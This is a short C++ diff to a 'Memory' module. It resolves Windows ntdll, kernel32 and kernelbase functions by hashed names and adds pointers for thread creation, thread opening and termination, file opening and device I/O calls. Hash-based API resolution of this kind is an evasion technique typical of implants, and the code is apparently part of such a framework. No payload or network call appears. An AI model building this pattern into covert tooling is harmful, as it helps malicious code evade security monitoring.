@@ -146,7 +146,11 @@ namespace Memory {
             x_memset(&Ctx->little, ENDIANESS, 1);
 
             if (!(Ctx->modules.kernel32 = M_PTR(KERNEL32))) {
-                return_defer(ERROR_PROC_NOT_FOUND);
+                return_defer(ERROR_MOD_NOT_FOUND);
+            }
+
+            if (!(Ctx->modules.kernbase = M_PTR(KERNELBASE))) {
+                return_defer(ERROR_MOD_NOT_FOUND);
             }
 
             if (!(F_PTR_HASHES(Ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
@@ -201,6 +205,7 @@ namespace Memory {
                 !(F_PTR_HMOD(Ctx->nt.NtOpenProcess,                 Ctx->modules.ntdll, NTOPENPROCESS)) ||
                 !(F_PTR_HMOD(Ctx->nt.NtCreateUserProcess,           Ctx->modules.ntdll, NTCREATEUSERPROCESS)) ||
                 !(F_PTR_HMOD(Ctx->nt.NtTerminateProcess,            Ctx->modules.ntdll, NTTERMINATEPROCESS)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtTerminateThread,             Ctx->modules.ntdll, NTTERMINATETHREAD)) ||
                 !(F_PTR_HMOD(Ctx->nt.RtlCreateProcessParametersEx,  Ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX)) ||
                 !(F_PTR_HMOD(Ctx->nt.RtlDestroyProcessParameters,   Ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS)) ||
                 !(F_PTR_HMOD(Ctx->nt.NtOpenProcessToken,            Ctx->modules.ntdll, NTOPENPROCESSTOKEN)) ||
@@ -217,6 +222,10 @@ namespace Memory {
                 !(F_PTR_HMOD(Ctx->nt.RtlInitUnicodeString,          Ctx->modules.ntdll, RTLINITUNICODESTRING)) ||
                 !(F_PTR_HMOD(Ctx->nt.RtlAddVectoredExceptionHandler, Ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER)) ||
                 !(F_PTR_HMOD(Ctx->nt.RtlRemoveVectoredExceptionHandler, Ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtCreateThreadEx,              Ctx->modules.ntdll, NTCREATETHREADEX)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtDeviceIoControlFile,         Ctx->modules.ntdll, NTDEVICEIOCONTROLFILE)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtOpenFile,                    Ctx->modules.ntdll, NTOPENFILE)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtOpenThread,                  Ctx->modules.ntdll, NTOPENTHREAD)) ||
                 !(F_PTR_HMOD(Ctx->nt.RtlRandomEx,                   Ctx->modules.ntdll, RTLRANDOMEX)) ||
                 !(F_PTR_HMOD(Ctx->nt.NtResumeThread,                Ctx->modules.ntdll, NTRESUMETHREAD)) ||
                 !(F_PTR_HMOD(Ctx->nt.NtGetContextThread,            Ctx->modules.ntdll, NTGETCONTEXTTHREAD)) ||
@@ -232,6 +241,7 @@ namespace Memory {
                 !(F_PTR_HMOD(Ctx->nt.NtQuerySystemInformation,      Ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION))) {
                 return_defer(ERROR_PROC_NOT_FOUND);
             }
+
             defer:
         }
     }
